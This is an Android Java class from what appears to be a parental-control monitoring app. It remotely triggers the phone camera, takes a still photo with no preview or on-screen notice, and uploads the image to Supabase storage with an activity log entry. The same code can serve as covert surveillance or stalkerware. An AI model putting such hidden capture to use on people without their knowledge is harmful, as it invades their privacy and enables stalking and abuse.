package com.parentalcontrol.monitor;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import androidx.core.content.ContextCompat;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

public class RemoteCameraController {
    
    private static final String TAG = "RemoteCameraController";
    
    public interface CameraCallback {
        void onCameraActivated(String imageUrl);
        void onCameraError(String error);
    }
    
    private Context context;
    private SupabaseClient supabaseClient;
    private String deviceId;
    
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Semaphore cameraOpenCloseLock = new Semaphore(1);
    
    private boolean isCameraActive = false;
    
    public RemoteCameraController(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
        this.deviceId = DeviceUtils.getDeviceId(context);
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }
    
    public void activateCamera(boolean frontCamera, int duration, CameraCallback callback) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
            != PackageManager.PERMISSION_GRANTED) {
            callback.onCameraError("Camera permission not granted");
            return;
        }
        
        if (isCameraActive) {
            callback.onCameraError("Camera already active");
            return;
        }
        
        try {
            startBackgroundThread();
            
            String cameraId = getCameraId(frontCamera);
            if (cameraId == null) {
                callback.onCameraError("Camera not available");
                return;
            }
            
            openCamera(cameraId, callback, duration);
            
        } catch (Exception e) {
            Log.e(TAG, "Error activating camera", e);
            callback.onCameraError("Failed to activate camera: " + e.getMessage());
        }
    }
    
    private String getCameraId(boolean frontCamera) {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if (frontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        return cameraId;
                    } else if (!frontCamera && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        return cameraId;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera ID", e);
        }
        return null;
    }
    
    private void openCamera(String cameraId, CameraCallback callback, int duration) {
        try {
            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                callback.onCameraError("Time out waiting to lock camera opening");
                return;
            }
            
            // Set up image reader
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        processImage(image, callback);
                        image.close();
                    }
                }
            }, backgroundHandler);
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraOpenCloseLock.release();
                    cameraDevice = camera;
                    isCameraActive = true;
                    createCaptureSession(callback, duration);
                }
                
                @Override
                public void onDisconnected(CameraDevice camera) {
                    cameraOpenCloseLock.release();
                    camera.close();
                    cameraDevice = null;
                    isCameraActive = false;
                }
                
                @Override
                public void onError(CameraDevice camera, int error) {
                    cameraOpenCloseLock.release();
                    camera.close();
                    cameraDevice = null;
                    isCameraActive = false;
                    callback.onCameraError("Camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Error opening camera", e);
            callback.onCameraError("Failed to open camera: " + e.getMessage());
        }
    }
    
    private void createCaptureSession(CameraCallback callback, int duration) {
        try {
            cameraDevice.createCaptureSession(
                Arrays.asList(imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        if (cameraDevice == null) return;
                        
                        captureSession = session;
                        captureStillPicture(callback);
                        
                        // Auto-deactivate after duration
                        backgroundHandler.postDelayed(() -> deactivateCamera(), duration * 1000);
                    }
                    
                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        callback.onCameraError("Failed to configure camera session");
                    }
                },
                backgroundHandler
            );
        } catch (Exception e) {
            Log.e(TAG, "Error creating capture session", e);
            callback.onCameraError("Failed to create capture session: " + e.getMessage());
        }
    }
    
    private void captureStillPicture(CameraCallback callback) {
        try {
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            
            captureSession.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
                    Log.d(TAG, "Image capture completed");
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing image", e);
            callback.onCameraError("Failed to capture image: " + e.getMessage());
        }
    }
    
    private void processImage(Image image, CameraCallback callback) {
        try {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            
            // Convert to bitmap and compress if needed
            Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
            if (bitmap != null) {
                // Compress image for upload
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream);
                byte[] compressedBytes = outputStream.toByteArray();
                
                // Upload image to Supabase storage
                uploadImageToSupabase(compressedBytes, callback);
            } else {
                callback.onCameraError("Failed to process captured image");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing image", e);
            callback.onCameraError("Failed to process image: " + e.getMessage());
        }
    }
    
    private void uploadImageToSupabase(byte[] imageBytes, CameraCallback callback) {
        // Generate unique filename
        String filename = "camera_" + deviceId + "_" + System.currentTimeMillis() + ".jpg";
        
        supabaseClient.uploadImage(filename, imageBytes, new SupabaseClient.ApiCallback() {
            @Override
            public void onSuccess(String response) {
                try {
                    // Log camera activation event
                    org.json.JSONObject cameraData = new org.json.JSONObject();
                    cameraData.put("event", "remote_camera_activated");
                    cameraData.put("image_url", response);
                    cameraData.put("timestamp", System.currentTimeMillis());
                    
                    supabaseClient.logActivity(deviceId, "camera", cameraData, new SupabaseClient.ApiCallback() {
                        @Override
                        public void onSuccess(String logResponse) {
                            callback.onCameraActivated(response);
                        }
                        
                        @Override
                        public void onError(String error) {
                            callback.onCameraActivated(response); // Still return image URL even if logging fails
                        }
                    });
                    
                } catch (Exception e) {
                    callback.onCameraError("Failed to log camera event: " + e.getMessage());
                }
            }
            
            @Override
            public void onError(String error) {
                callback.onCameraError("Failed to upload image: " + error);
            }
        });
    }
    
    public void deactivateCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            
            isCameraActive = false;
            stopBackgroundThread();
            
            Log.i(TAG, "Camera deactivated");
            
        } catch (Exception e) {
            Log.e(TAG, "Error deactivating camera", e);
        }
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }
    
    public void shutdown() {
        deactivateCamera();
        if (supabaseClient != null) {
            supabaseClient.shutdown();
        }
    }
    
    public boolean isCameraActive() {
        return isCameraActive;
    }
}